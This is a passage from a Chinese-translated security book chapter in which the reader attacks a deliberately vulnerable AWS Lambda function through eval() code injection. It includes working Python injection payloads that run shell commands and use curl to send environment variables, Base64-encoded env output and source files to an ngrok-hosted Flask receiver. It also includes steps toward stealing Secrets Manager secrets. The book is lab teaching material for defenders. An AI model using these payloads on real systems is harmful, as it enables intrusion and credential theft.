  ```\n\n以下响应表明所假设的角色会话已成功建立：\n\n```\n{\n    \"UserId\": \"...:lambda-0010\",\n  \
  \  \"Account\": \"...\",\n    \"Arn\": \"arn:aws:sts::...:assumed-role/lambda-0010-role-.../lambda-0010\"\
  \n}\n```\n\n从这里开始，如果附加的 Lambda 角色配置了提升的权限，你应该能够根据这些权限执行操作，例如访问账户中的其他 AWS 资源。如果角色过于宽松并附加了\
  \ `AdministratorAccess` 策略，你就可以有效地完全控制 AWS 账户。\n\n从防御安全角度来看，你永远不应将过于宽松的策略 例如 `AdministratorAccess`\
  \ 附加到 Lambda 执行角色。相反，应通过仅授予函数所需的特定权限来应用最小权限原则。你还应定期审查和审计 IAM 策略，以确保它们与函数的实际需求保持一致。此外，避免使用\
  \ `eval()` 或其他动态代码执行机制等危险函数，因为它们会引入代码注入风险并导致任意代码执行漏洞。\n\n### Exfiltrating Sensitive\
  \ Data via Code Injection and Outbound Network Access\n\n在前面的章节中，你探索了一个相对直接的代码注入场景：攻击者滥用不安全的动态代码执行，例如使用\
  \ `eval()`，在易受攻击的 Lambda 函数内运行任意命令。在此基础上，本节将进一步展示攻击者如何将类似的代码注入技术与出站网络访问相结合，从 Lambda\
  \ 执行环境中外泄敏感数据。\n\n为了帮助你深入了解攻击者如何绕过薄弱或实现不当的保护措施，本节分为三个部分：\n\n\n\n\n*   “使用有限代码注入防护更新\
  \ Lambda 函数”\n\n*   “设置接收外泄数据的服务器”\n\n*   “攻击易受攻击的无服务器 Web 应用程序”\n\n让我们继续更新你的易受攻击的无服务器实验环境设置。\n\
  \n#### 更新具有有限代码注入防护的 Lambda 函数\n\n在本节中，你将使用 `sanitize_output()` 函数更新现有的 Lambda 函数代码，以增加一层防御代码注入攻击的保护。虽然此新函数并非万无一失，但它会在输出返回之前过滤掉非数字字符，从而限制恶意代码执行的风险和影响。\n\
  \n#### Note\n\n本节假定你正在使用 Serverless Lab 账户，该账户托管易受攻击的无服务器实验环境。\n\n让我们通过更新 Lambda\
  \ 函数代码继续操作：\n\n1. 切回已打开 Serverless Lab AWS 账户的浏览器标签页。继续下一步之前，请确保已打开 `lambda-0010`\
  \ 的 AWS Lambda 函数详情页面。\n\n2. 找到“Code source”部分，然后用以下代码替换现有的 `lambda_function.py`\
  \ 代码：\n\n```\nimport re\n\nfrom os import environ\nget_env = environ.get\n\nHARDCODED_KEY_01\
  \ = \"ABCDE\"\nHARDCODED_KEY_02 = \"FGHIJ\"\n\n\ndef get_statement(event):\n   \
  \ params = event.get('queryStringParameters', {})\n    statement = params.get('statement',\
  \ None)\n\n    return statement\n\n\ndef process_statement(statement):\n    output\
  \ = \"No statement parameter value provided\"\n\n    if statement:\n        output\
  \ = eval(statement)\n\n    return output\n\n\ndef sanitize_output(output):\n   \
  \ return re.sub(r'[^-0-9\\.]', '', str(output))\n\n\ndef lambda_handler(event, context):\n\
  \    print(\"event: \", event)\n    print(\"HARDCODED_KEY_01: \", HARDCODED_KEY_01)\n\
  \    print(\"HARDCODED_KEY_02: \", HARDCODED_KEY_02)\n    print(\"CUSTOM_ENV_VAR_01:\
  \ \", get_env('CUSTOM_ENV_VAR_01'))\n    print(\"CUSTOM_ENV_VAR_02: \", get_env('CUSTOM_ENV_VAR_02'))\n\
  \n    statement = get_statement(event)\n    result = process_statement(statement)\n\
  \n    return {\n        'statusCode': 200,\n        'body': sanitize_output(result)\n\
  \    }\n```\n\n此 `sanitize_output()` 函数会剥离评估结果中所有非数字或点号的字符。这可确保只有经过清理的数值输出会被发送回用户。\n\
  \n#### Caution\n\n实现的 `sanitize_output()` 函数是有意设计为存在缺陷的，仅用于演示目的。它仅移除非数字字符，但在清理步骤之前，`eval()`\
  \ 函数仍可执行恶意表达式。\n\n3. 修改完 `lambda_function.py` 后，点击 Deploy。你应收到通知 `Successfully updated\
  \ the function lambda-0010`。\n\n4. 要测试刚部署的 Lambda 函数，请点击 Test。你应看到以下响应：\n\n```\n\
  Status: Succeeded\nTest Event Name: event-0010\n\nResponse:\n{\n  \"statusCode\"\
  : 200,\n  \"body\": \"2\"\n}\n\nFunction Logs:\nSTART RequestId: ... Version: $LATEST\n\
  event: {'queryStringParameters': {'statement': '1 + 1'}}\nHARDCODED_KEY_01:  ABCDE\n\
  HARDCODED_KEY_02:  FGHIJ\nCUSTOM_ENV_VAR_01:  KLMNO\nCUSTOM_ENV_VAR_02:  PQRST\n\
  END RequestId: ...\nREPORT RequestId: ...   Duration: 20.50 ms  Billed Duration:\
  \ 21 ms\nMemory Size: 128 MB Max Memory Used: 35 MB  Init Duration: 89.30 ms\n```\n\
  \n5. 切到已打开 S3 托管网站的浏览器标签页。然后输入并计算以下表达式：\n\n```\n1 + 2 + 3 / 4\n```\n\n这会产生以下输出：\n\
  \n```\n3.75\n```\n\n#### Tip\n\n为确保更新后的 Lambda 代码按预期工作，你可以随意测试其他场景，例如 `(1 * 2) /\
  \ 5` 和 `5 - 42`。\n\n6. 让我们检查应用程序对以下输入的响应方式：\n\n```\n__import__('subprocess').check_output('ls',\
  \ shell=True)\n```\n\n这会返回以下响应：\n\n```\n.\n```\n\n这里仅返回一个点 `.`，因为 `sanitize_output()`\
  \ 函数在 `eval()` 函数执行表达式后过滤掉了所有其他字符。\n\n7. 检查你是否仍能通过以下表达式检索源代码：\n\n```\n__import__('subprocess').check_output('cat\
  \ *.py', shell=True)\n```\n\n以下是输出：\n\n```\n.0102...-0-9.0101020201010202200---------\n\
  ```\n\n同样，输出被剥离为点和数字的混合体（以及负号），因为 `sanitize_output()` 过滤掉了所有其他字符。\n\n8. 让我们验证你是否能够检索环境变量：\n\
  \n```\n__import__('subprocess').check_output('env', shell=True)\n```\n\n你应得到以下响应：\n\
  \n```\n1-68859515-3978245150425469445213380001635003.13--120250726897265143959964--1..-801020695332-0010169.254.100.19001128169.254.100.1169.254.100.120000562276464.-8-0010-322357658187119782506095156401005074936293558585764898474881046818836747799591606034728881849831108942369153722321016774420488178155749911041812000\n\
  ```\n\n由于新的 `sanitize_output()` 函数已就位，你的 Lambda 函数*似乎*已受到代码注入攻击的保护。然而，正如你在以下各节中将看到的那样，Lambda\
  \ 函数的出站网络访问使攻击者能够将敏感数据（例如环境变量和源代码）发送到外部服务器。\n\n#### 设置接收外泄数据的服务器\n\n在上一节中，你为易受攻击的无服务器\
  \ Web 应用程序更新了 Lambda 函数，并添加了 `sanitize_output()` 函数，在将结果发送回前端之前剥离所有非数字字符。从攻击者的角度来看，此更改阻止了他们通过浏览器直接检索外泄数据，但底层漏洞仍然存在。攻击者仍可修改代码注入有效载荷，将外泄数据发送到其控制下的外部服务器，如\
  \ Figure 6-6 所示。\n\n![](img/lsse_0606.png)\n\n此外部服务器可以是基于云的虚拟机，例如 EC2 实例，或任何其他运行配置为接收外泄数据的\
  \ Web 服务器的主机。一旦此服务器准备就绪，攻击者就可以调整其有效载荷，直接将外泄数据（包括凭据和环境变量）发送到该服务器。然后，他们可以通过检查 Web\
  \ 服务器的访问日志或有效载荷写入的任何存储来检索外泄的值。请记住，当 Lambda 函数具有不受限制的出站访问权限时，这种方法是可行的。例如，当它未关联到 VPC\
  \ 时就会发生这种情况，因为未附加到 VPC 的函数默认通过 AWS 管理网络进行互联网出站。如果 Lambda 函数放置在 VPC 内，其出站连接性由 VPC\
  \ 配置决定，包括子网路由、NAT 或互联网网关的存在，以及安全组或网络访问控制列表中定义的出站规则。\n\n\n\n\n在本节中，你将在本地机器上运行一个服务器，该服务器将接收来自受损\
  \ Lambda 函数执行环境的外泄数据。更具体地说，你将设置一个用 Python 编写的简单 Flask 服务器，以接受传入的 HTTP 请求并记录接收到的负载。此本地服务器随后将通过\
  \ `ngrok` 暴露到互联网，`ngrok` 会创建一个安全的公共 HTTPS URL，将传入请求隧道传输到本地服务器的端口。\n\n#### Note\n\
  本节假设你使用的是本地机器，该机器将托管本地 Flask 服务器和接收外泄数据的 `ngrok` 隧道。如果你使用的是 Windows，请确保你有一种运行 macOS\
  \ 或 Linux 命令的方法（例如，通过使用 WSL 或带有 Linux 发行版的 VM）。这将帮助你在不遇到平台特定问题的情况下运行本节中的命令。或者，你可以在你的攻击者账户中启动一个\
  \ EC2 Linux 实例，关联一个 Elastic IP 地址，使用 Secure Shell `SSH` 访问该实例，然后在该实例上运行 Flask 服务器。^7\n\
  \n让我们继续在你的本地机器上设置本地服务器和 `ngrok` 隧道：\n\n1. 在本地机器上打开一个终端窗口，在此窗口中运行即将到来的命令。\n\n   ###\
  \ Tip\n   导航到你通常保存项目或实验文件的目录，以便以后可以轻松找到本章的项目文件。\n\n2. 创建一个名为 `request-receiver`\
  \ 的新项目目录，然后进入它：\n\n```\nmkdir request-receiver\n\ncd request-receiver\n```\n\n3.\
  \ 创建并激活一个 Python 虚拟环境：\n\n```\npython3 -m venv venv\nsource venv/bin/activate\n\
  ```\n\n此 Python 虚拟环境为你的项目依赖提供了一个隔离空间，防止与其他项目或系统范围的 Python 安装发生冲突。\n\n4. 创建一个空的 `requirements.txt`\
  \ 文件：\n\n```\ntouch requirements.txt\n```\n\n#### Note\n`requirements.txt` 文件指定了你的项目所需的\
  \ Python 包和版本。它作为依赖项的快照，让你可以使用单个 `pip install -r requirements.txt` 安装它们全部。例如，Flask\
  \ 项目可能包含像 `Flask==3.1.1` 这样的条目，以确保安装了正确的框架版本。\n\n5. 在代码编辑器中打开 `requirements.txt`\
  \ 文件并添加以下依赖项：^8\n\n```\nblinker==1.9.0\nclick==8.2.1\nFlask==3.1.1\nitsdangerous==2.2.0\n\
  Jinja2==3.1.6\nMarkupSafe==3.0.2\nWerkzeug==3.1.3\n```\n\n#### Caution\n编辑后不要忘记保存\
  \ `requirements.txt` 文件。\n\n6. 安装 `requirements.txt` 中列出的依赖项：\n\n```\npip install\
  \ -r requirements.txt\n```\n\n7. 使用 `touch` 命令创建一个空的 `app.py` 文件：\n\n```\ntouch\
  \ app.py\n```\n\n8. 在代码编辑器中打开 `app.py` 并添加以下代码：^9\n\n```\nfrom flask import Flask,\
  \ request\nfrom datetime import datetime, UTC\nfrom contextlib import contextmanager\n\
  \n\ndef print_pair(*args):\n    if len(args) == 2:\n        key, value = args\n\
  \        label = f\"{key}:\"\n        print(f\"{label:<25}{value}\")\n    else:\n\
  \        print(args[0])\n\n\n@contextmanager\ndef info(label):\n    print_line()\n\
  \    print(label)\n    print_line()\n    yield print_pair\n    print_line()\n\n\n\
  def print_line():\n    print(\"-\" * 100)\n\n\nMETHODS = ['GET', 'POST', 'PUT',\
  \ 'DELETE', 'PATCH', 'OPTIONS']\napp = Flask(__name__)\n\n@app.route('/', methods=METHODS)\n\
  @app.route('/<path:path>', methods=METHODS)\ndef catch_all(path=''):\n    with info(\"\
  NEW REQUEST\") as p:\n        p(\"Time\", datetime.now(UTC))\n        p(\"Method\"\
  , request.method)\n        p(\"Path\", request.path)\n\n    with info(\"HEADERS\"\
  ) as p:\n        for key, value in dict(request.headers).items():\n            p(f\"\
  {key}\", value)\n\n    with info(\"BODY\") as p:\n        p(request.get_data(as_text=True))\n\
  \n    return 'Request received\\n', 200\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',\
  \ port=8000)\n```\n\n此 Flask 服务器实现捕获所有传入的 HTTP 请求，并以清晰的结构化格式记录它们，以便你能快速从传入请求中检索特定值（例如环境变量、凭据、令牌或标头）。当\
  \ Flask 服务器接收到请求时，它会以结构化格式记录该请求的关键细节。然后它记录时间戳、HTTP 方法和路径，然后是标头以及原始正文内容。\n\n####\
  \ Note\nFlask 是一个用于构建 Web 应用程序的轻量级 Python 框架。^10 在此请求接收器 Web 应用程序中使用的 `@app.route`\
  \ 装饰器，你定义服务器应监听哪些 URL 以及哪个函数应处理每个请求。在本例中，`catch_all()` 函数配置为处理每种受支持的 HTTP 方法和路径，这使其能够捕获并记录任何传入请求，而不管\
  \ URL 如何。\n\n9. 在终端中，使用以下命令启动 Flask 应用程序：\n\n```\npython app.py\n```\n\n如果一切设置正确，你应该会看到以下输出，表明\
  \ Flask 正在端口 `8000` 上运行并准备接收请求：\n\n```\n* Serving Flask app 'app'\n * Debug mode:\
  \ off\nWARNING: This is a development server. Do not use it in a production\ndeployment.\
  \ Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n\
  \ * Running on http://127.0.0.1:8000\n * Running on http://192.168.254.159:8000\n\
  Press CTRL+C to quit\n```\n\n#### Tip\n确保让此 Flask 服务器保持运行，以确保它在 本章后续部分的测试期间可访问。\n\
  \n现在你已在本地机器上运行了 Flask 服务器，下一步是通过 `ngrok` 隧道使其公开可访问，以便你在模拟期间注入的恶意负载可以向服务器发送提取的数据（例如环境变量和源代码）。让我们继续执行设置\
  \ `ngrok` 隧道的步骤：\n\n1. 打开一个新的浏览器标签页并导航到 [*https://ngrok.com*](https://ngrok.com)\
  \ 以查看 `ngrok` 着陆页。\n\n   ### Note\n   在本章中，你将使用 `ngrok` 通过安全的公共 URL 将本地 Flask 服务器暴露到互联网。你需要注册一个\
  \ `ngrok` 账户，以便为本章的设置检索身份验证令牌 `authtoken`。^11\n\n2. 点击“Sign up”创建新账户。\n\n3. 完成注册流程，然后登录到你的\
  \ `ngrok` 仪表板。\n\n4. 在左侧边栏中，点击 Setup & Installation。\n\n5. 在新的终端窗口中，按照提供的安装说明下载并在本地机器上安装\
  \ `ngrok`。\n\n   ### Note\n   步骤将根据你的操作系统而有所不同。\n\n6. 安装 `ngrok` 后，切换回浏览器标签页，其中\
  \ `ngrok` 仪表板已打开。\n\n7. 在左侧边栏中，点击 Getting Started 部分下的 Your Authtoken。\n\n8. 点击你的\
  \ authtoken 旁边的 Copy 按钮。此 authtoken 将用于验证你的本地 `ngrok` 客户端。^12\n\n9. 切换回本地机器上的终端窗口。用复制的\
  \ authtoken 替换 `<YOUR AUTHTOKEN>`，然后运行以下命令以验证你的 `ngrok` 代理：\n\n```\nngrok config\
  \ add-authtoken <YOUR AUTHTOKEN>\n```\n\n10. 通过在端口 `8000` 上启动 `ngrok` 隧道将你的 Flask\
  \ 服务器暴露到互联网：\n\n```\nngrok http 8000\n```\n\n这会产生以下输出：\n\n\n\n\n\n```\nngrok   \
  \                                                                              \
  \                                                                              \
  \                       (Ctrl+C to quit)\n\nall internal services from your gateway:\
  \ ...\n\nSession Status          online\nAccount                 ... (Plan: Free)\n\
  Version                 3.23.3\nRegion                  Asia Pacific (ap)\nLatency\
  \                 47ms\nWeb Interface           http://127.0.0.1:4040\nForwarding\
  \              https://<ID>.ngrok-free.app -> http://localhost:8000\n\nConnections\
  \             ttl     opn     rt1     rt5     p50     p90\n                    \
  \    0       0       0.00    0.00    0.00    0.00\n```\n\n这里，`ngrok` 从一个公共 URL 创建到本地\
  \ Flask 服务器的安全隧道，将所有传入请求转发到端口 `8000`。^(13)\n\n#### Note\n\n请务必从 Forwarding 部分复制\
  \ HTTPS 转发 URL，例如 `https://<ID>.ngrok-free.app`。在后续步骤中你需要它来接收 HTTP 请求到本地。\n\n此时，你应该在本地机器上同时运行\
  \ Flask 服务器和 `ngrok` 隧道。有了这个设置，任何发送到 `ngrok` HTTPS 转发 URL 的请求都会通过隧道安全地转发到端口 `8000`\
  \ 上的 Flask 服务器。例如，如果包含环境变量的请求发送到 `ngrok` HTTPS 转发 URL，你应该会在 Flask 服务器日志中看到这些环境变量。\n\
  \n请记住，此设置旨在帮助你理解代码注入攻击后捕获和分析被窃取数据的过程。攻击者在真实攻击中通常会使用更复杂的工具和专用基础设施，以及更隐蔽的数据外泄技术。\n\
  \n#### Attacking the Vulnerable Serverless Web Application\n\n在前面的章节中，你在 Lambda\
  \ 代码中引入了一个部分有效的防御控制，并配置了一个攻击者控制的服务器来捕获被窃取的数据。在本节中，你将再次模拟攻击过程，并重点关注攻击者如何利用出站连接将敏感数据外泄到外部服务器。\n\
  \n一切准备就绪，让我们继续模拟：\n\n1. 切回浏览器标签页，其中 S3 托管的网站已打开。\n\n   ### Tip\n\n   如果你不小心关闭了浏览器标签页，可以通过在新标签页中导航到\
  \ `http://BUCKET_NAME.s3-website-REGION.amazonaws.com` 来重新打开你的 S3 托管静态网站。记得用你设置中的实际值替换\
  \ `BUCKET_NAME` 和 `REGION`。你也可以通过 AWS 管理控制台检索存储桶网站端点，方法是转到 S3 存储桶的 Properties 选项卡，并在“静态网站托管”下查看“存储桶网站端点”。\n\
  \n2. 输入并评估以下表达式以将你的环境变量发送到暴露的 Flask 服务器：\n\n   ```\n   __import__('os').system('curl\
  \ -X POST -d \\\"$(env)\\\" https://[GENERATED ID].ngrok-free.app')\n   ```\n\n\
  \   ### Note\n\n   请确保将 `[GENERATED ID]` 替换为 HTTPS 转发 URL 的 `<ID>` 值。\n\n3. 通过在新浏览器标签页中访问\
  \ *http​://127.0.0.1:4040* 打开本地 `ngrok` Web 界面 (Figure 6-7)。\n\n   在这里，你可以检查通过 `ngrok`\
  \ 隧道接收的 HTTP 请求，并从发送到 Flask Web 服务器的环境变量中提取凭据。\n\n   ### Note\n\n   你也可以通过检查 Flask\
  \ 服务器的终端输出来检查环境变量。\n\n   ![](img/lsse_0607.png)\n\n4. 切回浏览器标签页，其中 S3 托管的网站已打开，然后评估以下表达式以将你的\
  \ Base64 编码环境变量发送到暴露的 Flask 服务器：\n\n   ```\n   __import__('os').system('env | base64\
  \ | curl -X POST --data-binary @- https://[GENERATED ID].ngrok-free.app')\n   ```\n\
  \n   这里，`@-` 是一个 `curl` 参数，表示“从 stdin 读取请求体”。`@-` 和 `https` 之间必须有一个空格，即 `--data-binary\
  \ @- https://...`，以便数据源参数和目标 URL 是独立的 shell 参数。如果没有那个空格，URL 将成为同一 token 的一部分，命令将不会按预期运行。\n\
  \n   ### Tip\n\n   你可以通过在单独的终端窗口中运行以下命令来解码 Base64 编码的字符串：`echo \"<BASE64 ENCODED\
  \ STRING>\" | base64 -d`。\n\n5. 评估以下表达式以将 Lambda 函数的源代码外泄到你的 Flask 服务器：\n\n   ```\n\
  \   __import__('os').system('curl -X POST --data-binary @/var/task/lambda_function.py\
  \ https://[GENERATED ID].ngrok-free.app')\n   ```\n\n   此 shell 命令使用 `curl` 通过 `POST`\
  \ 请求将已部署 Lambda 函数源代码文件 (`/var/task/lambda_function.py`) 的原始内容发送到外部 HTTP 端点。\n\n\
  \   你应该得到以下 Flask 服务器输出：\n\n   ```\n   -------------------------------------------------------\n\
  \   BODY\n   -------------------------------------------------------\n   import\
  \ re\n   \n   from os import environ\n   get_env = environ.get\n   \n   HARDCODED_KEY_01\
  \ = \"ABCDE\"\n   HARDCODED_KEY_02 = \"FGHIJ\"\n   \n   \n   def get_statement(event):\n\
  \       params = event.get('queryStringParameters', {})\n       statement = params.get('statement',\
  \ None)\n   \n       return statement\n   \n   ...\n   ```\n\n看起来你的 Lambda 函数仍然容易受到代码注入攻击！你可能会想通过将环境变量中的密钥转移到\
  \ Secrets Manager 来解决这个问题。然而，正如你在下一节中将看到的，仅仅将密钥存储在 Secrets Manager 中并不能完全解决问题的根本原因。同时，它也无法阻止攻击者执行任意代码并可能外泄数据。\n\
  \n### Stealing Secrets Manager Secrets Through a Vulnerable Lambda Function\n\n\
  你经常听说使用密钥管理器服务存储密钥可以确保凭据得到安全存储和轮换。虽然这是真的，但它并不是万能的，因为攻击者仍可能通过利用 Lambda 函数中的漏洞或函数相关\
  \ IAM 角色的错误配置来获取密钥。\n\n在本节中，你将更新你的有意易受攻击的无服务器 Web 应用程序以使用 AWS Secrets Manager 作为主要的密钥存储。你将修改\
  \ Lambda 函数代码使其从 Secrets Manager 检索密钥，并相应地更新函数的角色权限。你随后将模拟通过代码注入漏洞窃取 Secrets Manager\
  \ 密钥的攻击，如 Figure 6-8 所示。\n\n![](img/lsse_0608.png)\n\n为了帮助你理解这些风险如何被利用和缓解，本节分为四个部分：\n\
  \n*   “Storing Secrets in AWS Secrets Manager”\n\n*   “Updating the Lambda Function\
  \ Role Permissions for Accessing Secrets Manager”\n\n*   “Updating the Lambda Function\
  \ Code to Retrieve Secrets from Secrets Manager”\n\n*   “Stealing Secrets Manager\
  \ Secrets Through a Code Injection Attack”\n\n\n\n\n\n在本节结束时，您将更好地了解攻击者如何利用代码注入漏洞和角色配置错误来从\
  \ Secrets Manager 中窃取机密。\n\n#### 在 AWS Secrets Manager 中存储机密\n\n如果您之前使用过无服务器应用程序，您可能听说过使用\
  \ AWS Secrets Manager 来处理敏感信息（如 API 密钥、数据库凭据或访问令牌）的建议。Secrets Manager 通过提供安全且集中的方式来存储、检索和自动轮换机密，从而消除了将机密硬编码到\
  \ Lambda 函数中的风险。这在无服务器环境中尤其有价值，因为代码经常更新和部署，使硬编码机密成为一种危险的做法。\n\n#### Note\n本节假定您使用的是\
  \ Serverless Lab 账户，该账户将托管易受攻击的无服务器实验室环境。\n\n让我们逐步了解如何在 AWS Secrets Manager 中存储机密：\n\
  \n1. 打开一个新的浏览器标签页并导航到 [AWS 管理控制台](https://oreil.ly/qe5es)，使用您的 Serverless Lab AWS\
  \ 账户。\n2. 在搜索栏中输入 `secrets manager`；然后从匹配的服务列表中选择 Secrets Manager，以导航到 Secrets Manager\
  \ 控制台。\n3. 在 Secrets Manager 控制台上，选择左侧导航窗格中的 Secrets，然后单击“Store a new secret。”\n\
  4. 在“Choose secret type”页面下，在“Secret type”下，选择“Other type of secret。” 在“Key/value\
  \ pairs”下，指定以下配对：\n   * `secret1`: `secret-value1`\n   * `secret2`: `secret-value2`\n\
  \   * `secret3`: `secret-value3`\n   然后单击 Next。\n5. 在“Configure secret”页面下，在“Secret\
  \ name and description”下，在“Secret name”字段中输入 `prod/lambda-secret`。然后单击 Next。\n6.\
  \ 在“Configure rotation”页面，单击 Next。\n7. 在 Review 页面，向下滚动到底部并单击 Store。\n\n#### Note\n\
  出现以下通知，表明机密已成功创建：`You successfully stored the secret prod/lambda-secret. To show\
  \ it in the list, click Refresh`。\n\n有了这个，您可以继续更新附加到 Lambda 函数的 IAM 角色，以确保它具有正确的安全访问\
  \ AWS Secrets Manager 的权限。\n\n#### 更新 Lambda 函数角色权限以访问 Secrets Manager\n\n目前，附加到\
  \ Lambda 函数的 IAM 角色没有访问 AWS Secrets Manager 所需的权限。在本节中，我将指导您为 Lambda 角色创建自定义内联策略，允许函数安全地访问和检索机密。\n\
  \n#### Note\n本节假定您使用的是 Serverless Lab 账户，该账户托管易受攻击的无服务器实验室环境。\n\n让我们继续更新 Lambda\
  \ 执行角色：\n\n1. 切换回已打开 AWS Lambda 控制台的浏览器标签页。确保在继续下一步之前，已打开 `lambda-0010` 的 AWS Lambda\
  \ 函数详细信息页面。\n2. 导航到 Configuration 选项卡。然后单击 Permissions。在 Execution Role 部分，单击“Role\
  \ name”下的链接，在新标签页中打开 IAM 角色详细信息，在其中查看或修改其权限。\n3. 在“Permissions policies”部分（在 Permissions\
  \ 选项卡上），单击“Add permissions。” 然后从可用选项列表中选择“Create inline policy”。\n\n#### Note\n\
  这应该指导您完成创建内联策略的过程，该过程包括两个步骤：指定权限以及查看和创建策略。\n\n4. 在“Specify permissions”页面下，在“Select\
  \ a service”下，从下拉菜单中选择 Secrets Manager。\n   在“Actions allowed”下，单击 List 以显示可用选项。切换打开“All\
  \ list actions”复选框。这应自动选择与 Secrets Manager 相关的所有仅列出权限。\n   然后单击 Read 以显示可用选项。切换打开“All\
  \ read actions”复选框。这应自动选择与 Secrets Manager 相关的所有只读权限。\n   在 Resources 下，选择 All。然后单击\
  \ Next。\n5. 在“Review and create”页面，在“Policy name”字段中指定策略名称（例如，`read-secrets-manager-policy`）。然后单击“Create\
  \ policy。”\n\n#### Note\n出现以下通知，表明策略已成功创建：`Policy read-secrets-manager-policy created.`\
  \ \n\n请随意查看策略 JSON 以确认已应用正确的权限。您可以使用生成式 AI 工具进行审查和验证，以便了解策略授予的权限并确认包含正确的操作和资源。由于生成式\
  \ AI 工具可能会产生不准确的信息，请记住始终将详细信息与官方 AWS 文档进行交叉检查。\n\n一旦您验证内联策略授予了必要的 Secrets Manager\
  \ 权限，您就可以继续更新 Lambda 函数代码以完成设置。\n\n#### 更新 Lambda 函数代码以从 Secrets Manager 检索机密\n\n\
  在本节中，您将更新前几节中的 Lambda 函数代码以从 Secrets Manager 检索机密。更具体地说，您将定义一个 `get_secret()` 函数，该函数使用提供的机密名称和区域通过\
  \ `GetSecretValue` API 检索机密。您会看到，通过 `boto3` Python 包从 Secrets Manager 检索机密只需要几行额外的代码。\n\
  \n#### Note\n本节假定您使用的是 Serverless Lab 账户，该账户托管易受攻击的无服务器实验室环境。\n\n让我们继续更新 Lambda\
